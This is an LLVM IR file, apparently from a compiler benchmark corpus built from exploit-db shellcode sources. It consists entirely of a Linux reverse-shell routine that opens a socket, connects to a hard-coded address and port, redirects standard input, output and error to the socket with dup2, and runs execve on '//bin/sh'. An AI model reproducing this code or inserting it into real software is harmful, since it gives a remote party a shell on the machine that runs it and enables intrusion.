; ModuleID = '/home/carl/AnghaBench/exploitdb/shellcodes/linux_x86/extr_43674.c_c_code.c'
source_filename = "/home/carl/AnghaBench/exploitdb/shellcodes/linux_x86/extr_43674.c_c_code.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [17 x i8] c"\02\00\EF\B0\00\00\00\00\00\00\00\00\00\00\00\00\00", align 1
@.str.1 = private unnamed_addr constant [9 x i8] c"//bin/sh\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @c_code() #0 {
  %1 = alloca [2 x i8*], align 16
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  store i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str, i64 0, i64 0), i8** %2, align 8
  %4 = call i32 @socket(i32 2, i32 1, i32 6)
  store i32 %4, i32* %3, align 4
  %5 = load i32, i32* %3, align 4
  %6 = load i8*, i8** %2, align 8
  %7 = call i64 @connect(i32 %5, i8* %6, i32 16)
  %8 = icmp slt i64 %7, 0
  br i1 %8, label %9, label %11

9:                                                ; preds = %0
  %10 = call i32 (...) @exit() #3
  unreachable

11:                                               ; preds = %0
  %12 = load i32, i32* %3, align 4
  %13 = call i32 @dup2(i32 %12, i32 0)
  %14 = load i32, i32* %3, align 4
  %15 = call i32 @dup2(i32 %14, i32 1)
  %16 = load i32, i32* %3, align 4
  %17 = call i32 @dup2(i32 %16, i32 2)
  %18 = getelementptr inbounds [2 x i8*], [2 x i8*]* %1, i64 0, i64 0
  store i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.1, i64 0, i64 0), i8** %18, align 16
  %19 = getelementptr inbounds [2 x i8*], [2 x i8*]* %1, i64 0, i64 1
  store i8* null, i8** %19, align 8
  %20 = getelementptr inbounds [2 x i8*], [2 x i8*]* %1, i64 0, i64 0
  %21 = load i8*, i8** %20, align 16
  %22 = getelementptr inbounds [2 x i8*], [2 x i8*]* %1, i64 0, i64 0
  %23 = call i32 @execve(i8* %21, i8** %22, i32* null)
  %24 = call i32 (...) @exit() #3
  unreachable
}

declare dso_local i32 @socket(i32, i32, i32) #1

declare dso_local i64 @connect(i32, i8*, i32) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(...) #2

declare dso_local i32 @dup2(i32, i32) #1

declare dso_local i32 @execve(i8*, i8**, i32*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
